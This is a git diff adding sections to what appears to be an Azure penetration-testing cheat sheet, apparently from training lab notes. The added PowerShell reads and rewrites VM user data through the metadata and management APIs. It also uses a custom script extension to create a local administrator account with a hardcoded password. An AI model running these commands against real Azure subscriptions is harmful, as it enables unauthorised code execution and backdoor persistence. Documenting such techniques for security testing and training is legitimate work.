@@ -100,6 +100,48 @@ az ad signed-in-user show
 Get-AzContext
 ```
 
+#### Check UserData
+```
+$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text";[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
+```
+
+#### Modify UserData
+```
+## It is also possible to modify user data with permissions "Microsoft.Compute/virtualMachines/write" on the target VM. Any automation or scheduled task reading commands from user data can be abused!
+
+$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
+$accessToken = (Get-AzAccessToken).Token
+$Url = "https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm?api-version=2021-07-01"
+$body = @(
+@{
+location = "Germany West Central"
+properties = @{
+userData = "$data"
+}
+}
+) | ConvertTo-Json -Depth 4
+
+$headers = @{
+Authorization = "Bearer $accessToken"
+}
+
+## Execute Rest API Call
+
+$Results = Invoke-RestMethod -Method Put -Uri $Url -Body $body -Headers $headers -ContentType 'application/json'
+```
+
+#### Check VM Extensions
+```
+Get-AzVMExtension -ResourceGroupName Research -VMName infradminsrv
+```
+
+#### Set VM Extensions
+```
+#Following permissions are required to create a custom script extension and read the output: "Microsoft.Compute/virtualMachines/extensions/write" and "Microsoft.Compute/virtualMachines/extensions/read"
+
+Set-AzVMExtension -ResourceGroupName Research -VMName infradminsrv -ExtensionName ExecCmd -Location germanywestcentral -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student87 Stud87Password@123 /add /Y; net localgroup administrators student87 /add /Y"}'
+```
+
 #### Get access token
 Supported tokens = aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
 ```
